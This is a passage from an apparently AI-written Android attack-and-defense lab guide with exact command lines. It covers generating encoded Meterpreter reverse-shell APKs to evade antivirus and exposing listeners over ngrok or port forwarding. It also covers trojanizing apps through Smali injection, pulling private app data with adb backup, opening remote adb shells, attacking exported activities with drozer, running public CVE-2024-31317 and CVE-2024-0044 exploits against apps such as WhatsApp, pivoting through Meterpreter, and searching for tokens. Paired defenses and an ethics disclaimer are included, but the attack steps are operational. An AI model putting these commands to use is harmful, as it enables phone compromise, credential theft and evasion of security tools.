      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Scrutinize App Permissions: If a simple game asks for location and SMS permissions, do not install it. Cyrus merges permissions, so the trojanized app will request all the malicious permissions alongside the legitimate ones.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Check App Signatures: In an enterprise setting, an MDM can enforce that only apps signed by the company or known vendors are installed. This is difficult for individual users.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Runtime Monitoring: Endpoint Detection and Response (EDR) solutions for mobile can detect when an app suddenly spawns a network connection to a suspicious IP (your C2 server) or starts behaving like a RAT.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Part 3: Exploring MSFvenom Payload Generator</text:p>
      <text:p text:style-name="Preformatted_20_Text">This tool is an interactive wrapper around msfvenom, making payload generation much easier and more organized.</text:p>
      <text:p text:style-name="Preformatted_20_Text">3.1 Key Features Explained</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Interactive Menus: No more memorizing complex msfvenom syntax. You select your OS, payload type, and options from a menu.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Encoding: It guides you through choosing encoders (shikata_ga_nai, etc.) and the number of iterations to evade simple signature-based AV.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Organized Output: It automatically creates a folder structure (e.g., output/windows/, output/android/) to keep your payloads tidy.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Listener Config Generator: After generating a payload, it can create a corresponding Metasploit resource script (.rc) file, so you can start the listener instantly with msfconsole -r file.rc.</text:p>
      <text:p text:style-name="Preformatted_20_Text">3.2 Step-by-Step Lab</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 1: Clone and Run</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/Allu555/MSFvenom-Payload-Generator.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd MSFvenom-Payload-Generator</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 msfvenom_payload_generator.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 2: Generate an Android Payload</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>1. Select [1] Android from the main menu.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Choose your payload type, likely [1] android/meterpreter/reverse_tcp.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Enter your LHOST (your Kali IP).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Enter your LPORT (e.g., 4444).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. The tool will ask if you want to encode it. For learning, you can try yes and select an encoder like x86/shikata_ga_nai with 5 iterations.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>6. Enter an output name, e.g., my_android_payload.apk.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>7. The tool generates the payload and saves it in the output/ directory. It also creates a listener file like output/android_meterpreter_reverse_tcp_4444.rc.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 3: Use the Listener File</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfconsole -r output/android_meterpreter_reverse_tcp_4444.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">This automatically starts the handler with all the correct settings. You're ready to catch the connection from your test device.</text:p>
      <text:p text:style-name="Preformatted_20_Text">3.3 Value of Organized Tools</text:p>
      <text:p text:style-name="Preformatted_20_Text">This generator is invaluable for penetration testers who need to quickly spin up multiple payload types for different engagements without referencing cheat sheets constantly. The automatic listener creation saves significant time and reduces configuration errors.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Key Technical Concepts Explained</text:p>
      <text:p text:style-name="Preformatted_20_Text">Port Forwarding in This Context</text:p>
      <text:p text:style-name="Preformatted_20_Text">If your target Android device is not on the same local network as your Kali machine, the reverse connection won't work directly. You need port forwarding.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Scenario: Your Kali machine is at home (IP 192.168.1.159), but the target device is on a cellular network or another Wi-Fi.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution using Port Forwarding on your Home Router:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Configure your Router: Log into your router's admin panel and find "Port Forwarding" or "Virtual Server".</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Create a Rule:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ External Port: 4444 (the port the world will connect to)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Internal IP Address: 192.168.1.159 (your Kali machine's local IP)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Internal Port: 4444 (the port your listener is on)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Protocol: TCP</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Find your Public IP: Go to a website like ifconfig.me or whatsmyip.org on your Kali machine. Note this public IP (e.g., 82.xx.yy.zz).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Generate Payload with Public IP: When using msfvenom, set LHOST=82.xx.yy.zz (your public IP). The target device will connect to your public IP, and your router will forward that traffic to your Kali machine.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Start Listener: On Kali, your LHOST in the handler should still be your local IP (192.168.1.159).</text:p>
      <text:p text:style-name="Preformatted_20_Text">Alternative: Ngrok A simpler way is to use ngrok, which creates a secure tunnel to a public URL.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. On Kali: ngrok tcp 4444</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Ngrok will give you a public address like 0.tcp.ngrok.io:12345.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Generate Payload: Set LHOST=0.tcp.ngrok.io and LPORT=12345.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Start Listener: On Kali, keep your local listener on LHOST=0.0.0.0 and LPORT=4444. Ngrok forwards the public connection to your local port.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How an App is "Put Inside Another App" (Embedding)</text:p>
      <text:p text:style-name="Preformatted_20_Text">The process of embedding a payload (like from Cyrus) is more complex than just "putting a file inside." It involves:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. DEX Merging: Android apps run code compiled into .dex files. The malicious app's DEX code is merged with the legitimate app's DEX code.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Manifest Merging: The AndroidManifest.xml file, which declares permissions, activities, and services, is merged. The tool must combine permissions (&lt;uses-permission&gt;) and inject the malicious service declaration.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Smali Injection: The payload's startup code is often injected into the legitimate app's main Application class or a primary Activity's onCreate() method. This is done at the Smali level (the human-readable assembly language of Android). The injector adds lines of Smali code to start the malicious service when the <text:soft-page-break/>legitimate app launches.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">How to Defend Against These Attacks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Strict Sideloading Policy: For organizations, implement a Mobile Device Management (MDM) solution that blocks installation from unknown sources by default.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. App Vetting: For individuals, only download apps from the official Google Play Store. While not 100% foolproof, Play Protect scans apps and the barrier to entry for malware is higher.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Permission Auditing: Regularly review app permissions. Go to Settings &gt; Apps &gt; [App Name] &gt; Permissions. Revoke any permission that seems unnecessary (e.g., a flashlight app requesting location).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Use a Mobile Security App: Reputable security suites (like Malwarebytes, Bitdefender, etc.) often include real-time scanning for malicious apps and behavior monitoring.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Keep Android Updated: Security patches often close the very vulnerabilities that payloads exploit to gain elevated privileges.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>6. Network-Level Protection: On a corporate network, use a firewall or intrusion detection system (IDS) to monitor for unusual outbound connections to known command-and-control (C2) servers.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>7. Endpoint Detection and Response (EDR): For high-security environments, mobile EDR solutions can detect process injection, anomalous network traffic, and attempts to access sensitive data.</text:p>
      <text:p text:style-name="Preformatted_20_Text">This lab should provide a deep, practical understanding of modern Android attack vectors. Remember, the goal of understanding these tools is to build better defenses. Always operate ethically and within legal boundaries.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Excellent request. A deep dive into Android security from both the attacker's and defender's perspective, with exact command lines, is the best way to truly understand the battlefield. Let's structure this as a comprehensive, command-line-driven "Battle Guide."</text:p>
      <text:p text:style-name="Preformatted_20_Text">We will progress from foundational techniques to advanced exploits, pairing each attack with its corresponding defense command. I will provide long, detailed explanations for each step.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Lab Environment Prerequisites</text:p>
      <text:p text:style-name="Preformatted_20_Text">Before we begin, ensure you have:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. A Kali Linux Machine (Attacker/ Analyst).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. A Test Android Device (Physical or Emulator) with USB Debugging Enabled. CRITICAL: Use a test device you own. Data on the device may be at risk.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Android SDK Platform Tools installed on your Kali machine (to get adb and fastboot).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Python 3 and pip installed.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Phase 1: The Entry Point - Exploiting the Debug Bridge</text:p>
      <text:p text:style-name="Preformatted_20_Text">This phase focuses on attacks that leverage a physical connection to the device via USB, a common scenario in "juice jacking" or forensic investigations.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 1.1: ADB Backup Exploitation (Extracting Private App Data)</text:p>
      <text:p text:style-name="Preformatted_20_Text">If an app allows backups ( android:allowBackup="true" in its manifest), an attacker with USB access can extract all its private data, even without root.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Check if a device is connected and authorized</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb devices</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># List all installed third-party packages to find a target</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell pm list packages -3</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Attempt a full backup of a specific app (e.g., a vulnerable note-taking app)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb backup -f note_backup.ab com.example.vulnerable.notepad</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>On the Android device, the user might see a prompt asking to "Allow backup?" <text:soft-page-break/>If they confirm (or if it's a headless device), the backup proceeds.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Post-Processing: The backup file (note_backup.ab) is in Android Backup format. The attacker can extract it using abe (Android Backup Extractor).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Convert the backup to a tar archive</text:p>
      <text:p text:style-name="Preformatted_20_Text">java -jar abe.jar unpack note_backup.ab note_backup.tar</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Extract the tar file to see all the app's private data (databases, shared_prefs, etc.)</text:p>
      <text:p text:style-name="Preformatted_20_Text">tar -xvf note_backup.tar</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 1.1: Disable Backup and Audit Manifest</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Developer's Command (In AndroidManifest.xml): The primary defense is for app developers to explicitly disable backups for sensitive apps.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>&lt;application ...</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:allowBackup="false"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:fullBackupContent="false"&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;/application&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Auditor's Command (Static Analysis with aapt): A security auditor can quickly check an APK's manifest for this misconfiguration without needing the source code.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Use aapt (Android Asset Packaging Tool) to extract and grep the manifest</text:p>
      <text:p text:style-name="Preformatted_20_Text">aapt dump badging /path/to/app.apk | grep allowBackup</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>If the output shows allowBackup='true' or nothing (as true is often the default for older targets), the app is vulnerable.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 1.2: ADB over Network (Remote Access)</text:p>
      <text:p text:style-name="Preformatted_20_Text">If an attacker gains a foothold on the same Wi-Fi network as the victim's device and ADB-over-network is enabled, they can connect remotely.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command (After finding the device's IP):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Connect to the device's ADB port (usually 5555)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb connect 192.168.1.100:5555</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># If successful, they now have a remote shell</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 1.2: Disable ADB over Network and Monitor Connections</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• User's Command (On the Android Device): The user should ensure "ADB over network" is disabled in Developer Options. It is off by default.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Administrator's Command (Network Monitoring): On a corporate network, an IDS can alert on connections to port 5555.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Using tcpdump on a network gateway to monitor for ADB traffic</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo tcpdump -i eth0 port 5555</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Phase 2: Deep Reconnaissance - Information Gathering on the Device</text:p>
      <text:p text:style-name="Preformatted_20_Text">Once a connection is established (physically or remotely), the attacker will perform detailed reconnaissance.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 2.1: Extracting All Installed Packages and their Paths</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Get a clean list of all third-party app package names</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell pm list packages -3 -f &gt; app_list.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># For a specific app, find the exact location of its APK</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell pm path com.example.target.app</text:p>
      <text:p text:style-name="Preformatted_20_Text"># This might output: package:/data/app/com.example.target.app-xyz/base.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 2.2: Pulling APKs for Offline Reverse Engineering</text:p>
      <text:p text:style-name="Preformatted_20_Text">An attacker will pull the APK files to analyze them for further vulnerabilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Pull the APK from the path found in the previous step</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb pull /data/app/com.example.target.app-xyz/base.apk target_app.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 2.3: Dumping System Information</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Get detailed build properties (Android version, SDK, etc.)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell getprop | grep -E "ro.build.version|ro.product.model"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/></text:p>
      <text:p text:style-name="Preformatted_20_Text"># List all permissions granted to a specific app</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell dumpsys package com.example.target.app | grep -A 10 "runtime permissions"</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 2: Runtime Monitoring and Alerting</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Defender's Command (Using logcat for Anomalous Activity): A user with a rooted device can monitor system logs for unusual access patterns, though this is noisy.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Monitor logs for 'pm' (package manager) or 'pull' activities (requires root on device to see all)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb logcat | grep -E "pm|pull"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Proactive Defense (Using a tool like Sandroid ): A security researcher can use dynamic analysis tools to profile what an app normally does. Deviations can then be detected. Sandroid (Dexray-Intercept) hooks into app behavior .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Profile an app's filesystem and network activity on a rooted test device</text:p>
      <text:p text:style-name="Preformatted_20_Text">dexray-intercept --hooks-filesystem --hooks-network com.example.target.app</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Phase 3: Application Layer Attacks - Exploiting Weak Code</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is where the attacker analyzes the pulled APK to find vulnerabilities in the app's own code.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 3.1: Exploitable Activity Exposure with Drozer</text:p>
      <text:p text:style-name="Preformatted_20_Text">An attacker can use drozer <text:s/>to interact with an app's IPC endpoints without needing to fully reverse engineer it.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Setup:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># On the attacker's machine, forward the drozer port</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb forward tcp:31415 tcp:31415</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Connect the drozer console</text:p>
      <text:p text:style-name="Preformatted_20_Text">drozer console connect</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Commands (Inside Drozer Console):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># List all packages</text:p>
      <text:p text:style-name="Preformatted_20_Text">run app.package.list</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Find attack surface of a target app</text:p>
      <text:p text:style-name="Preformatted_20_Text">run app.package.attacksurface com.example.target.app</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># If an Activity is exported, attempt to start it directly</text:p>
      <text:p text:style-name="Preformatted_20_Text">run app.activity.start --component com.example.target.app com.example.target.app.SettingsActivity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>If the attacker can start a privileged settings activity without authentication, that's a major vulnerability.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 3.1: Proper Android Component Export Configuration</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Developer's Commands (in AndroidManifest.xml): The core defense is explicitly setting exported="false" for components that should not be launched by other apps.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>&lt;activity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:name=".SettingsActivity"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:exported="false" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>For activities that must be exported (e.g., a share handler), use permission checks:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>&lt;activity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:name=".ShareActivity"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:exported="true"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:permission="android.permission.INTERACT_ACROSS_USERS_FULL" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 3.2: Exploiting Insecure Data Storage</text:p>
      <text:p text:style-name="Preformatted_20_Text">An attacker analyzes the app's private data (pulled via ADB backup or by examining the filesystem on a rooted device) to find secrets.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command (After gaining access to app's data directory):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Look for databases</text:p>
      <text:p text:style-name="Preformatted_20_Text">find /data/data/com.example.target.app -name "*.db"</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/># Query a database for credentials</text:p>
      <text:p text:style-name="Preformatted_20_Text">sqlite3 /data/data/com.example.target.app/databases/secure_storage.db "SELECT * FROM accounts;"</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 3.2: Use Android Keystore System</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Developer's Code (Kotlin Example): Instead of storing keys or passwords in SharedPreferences or a database, they should be stored in the Android Keystore.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>// Get an instance of the Keystore</text:p>
      <text:p text:style-name="Preformatted_20_Text">val keyStore = KeyStore.getInstance("AndroidKeyStore")</text:p>
      <text:p text:style-name="Preformatted_20_Text">keyStore.load(null)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">// Generate a key (example for HMAC)</text:p>
      <text:p text:style-name="Preformatted_20_Text">val keyGenerator = KeyGenerator.getInstance(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>KeyProperties.KEY_ALGORITHM_HMAC_SHA256, "AndroidKeyStore")</text:p>
      <text:p text:style-name="Preformatted_20_Text">val keyGenSpec = KeyGenParameterSpec.Builder("app_key",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>KeyProperties.PURPOSE_SIGN).build()</text:p>
      <text:p text:style-name="Preformatted_20_Text">keyGenerator.init(keyGenSpec)</text:p>
      <text:p text:style-name="Preformatted_20_Text">val secretKey = keyGenerator.generateKey()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>This key never enters the app's process memory in a usable form, making extraction extremely difficult.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Phase 4: Advanced System-Level Exploits</text:p>
      <text:p text:style-name="Preformatted_20_Text">These attacks target the Android operating system itself, using known CVEs.</text:p>
      <text:p text:style-name="Preformatted_20_Text">**Attack 4.1: Exploiting CVE-2024-31317 (Zygote Injection) **</text:p>
      <text:p text:style-name="Preformatted_20_Text">This vulnerability allows an attacker with ADB access to inject code into the privileged Zygote process, gaining system user privileges.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Commands:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Install the toolkit</text:p>
      <text:p text:style-name="Preformatted_20_Text">pip install --upgrade git+https://github.com/Anonymous941/zygote-injection-toolkit.git</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Ensure a device is connected and ADB is running</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb start-server</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Run the exploit</text:p>
      <text:p text:style-name="Preformatted_20_Text">python -m zygote_injection_toolkit</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>If successful, the attacker gets a reverse shell on port 1234 with system privileges, allowing them to read/write any app's private data.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 4.1: Apply Security Patches</text:p>
      <text:p text:style-name="Preformatted_20_Text">The only defense against a patched CVE is to install the security update.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• User's Command (Check Patch Level):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>adb shell getprop ro.build.version.security_patch</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>This should be after June 1, 2024 to be protected against CVE-2024-31317.</text:p>
      <text:p text:style-name="Preformatted_20_Text">**Attack 4.2: Exploiting CVE-2024-0044 with EvilDroid **</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is an Android framework vulnerability that allows an attacker to install a malicious app that can then gain elevated privileges.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Commands:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Clone the EvilDroid repository</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/sridhar-sec/EvilDroid.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd EvilDroid</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Run the exploit against a target app (e.g., WhatsApp)</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 evildroid.py -p com.whatsapp -a /path/to/malicious/payload.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 4.2: SELinux Policy Hardening</text:p>
      <text:p text:style-name="Preformatted_20_Text">Modern Android versions use fine-grained SELinux policies to block such exploits. Google's official documentation shows how OEMs can harden their devices . A macro like set_xperm_filter is used to block restricted IOCTLs that exploits rely on.</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Example from AOSP for GPU filtering, a similar principle applies</text:p>
      <text:p text:style-name="Preformatted_20_Text">set_xperm_filter(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>gpu_device,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="2"/>untrusted_app_sdk_gate,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>unpriv_ioctls,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>restricted_ioctls,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>instrumentation_ioctls)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Phase 5: Post-Exploitation &amp; Lateral Movement</text:p>
      <text:p text:style-name="Preformatted_20_Text">Once a foothold is established, the attacker moves from the device to the network or cloud.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 5.1: Port Forwarding for Pivoting</text:p>
      <text:p text:style-name="Preformatted_20_Text">The attacker uses the compromised Android device as a pivot point to attack other devices on the victim's local network.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command (Using Meterpreter session):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Inside a Meterpreter session on the Android device</text:p>
      <text:p text:style-name="Preformatted_20_Text">portfwd add -L 0.0.0.0 -l 8080 -p 80 -r 192.168.1.50</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>This forwards traffic from the attacker's machine on port 8080 to a target internal server (192.168.1.50) through the compromised Android device's connection.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 5.2: Credential Harvesting from Cloud Apps</text:p>
      <text:p text:style-name="Preformatted_20_Text">The attacker looks for OAuth tokens or cloud service credentials stored on the device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attacker's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Search for common cloud configuration files</text:p>
      <text:p text:style-name="Preformatted_20_Text">find /data/data -name "*aws*" -o -name "*google*" -o -name "*token*" 2&gt;/dev/null</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 5: Network Segmentation &amp; Cloud Security Posture Management (CSPM)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Network Defense: The best defense against pivoting is strict network segmentation. IoT devices and mobile devices should be on a separate VLAN from critical servers, with firewall rules preventing direct lateral movement.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Cloud Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Short-lived tokens: Cloud services should issue tokens with very short expiration times.</text:p>
